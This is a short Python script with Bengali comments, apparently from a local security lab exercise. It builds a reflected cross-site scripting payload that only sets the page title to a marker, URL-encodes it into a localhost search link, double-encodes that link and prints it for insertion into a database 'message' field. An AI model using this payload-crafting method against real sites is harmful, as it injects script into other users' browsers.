import urllib.parse

# ১ম স্ক্রিপ্ট (Reflected XSS পেলোড)
payload = '<script>document.title="B1-REFLECTED-XSS"<\\/script>'

# ১ম স্তর: payload কে URL encode করে লিংক বানাই
# safe='' দিতে হবে, যাতে '/' ও ':' সব এনকোড হয়
encoded_payload = urllib.parse.quote(payload, safe='')  
link = "http://localhost:5001/search?q=" + encoded_payload

# ২য় স্তর: পুরো লিংকটাকে আবার URL encode করি (এটাই 'message'-এর ভ্যালু হবে)
# safe='' দিতে হবে, নাহলে '/' এনকোড হবে না
final_message_value = urllib.parse.quote(link, safe='')

# কেবল মাত্র message-এর ভ্যালু প্রিন্ট করি (যেটা SQL-এ বসাতে হবে)
print(final_message_value)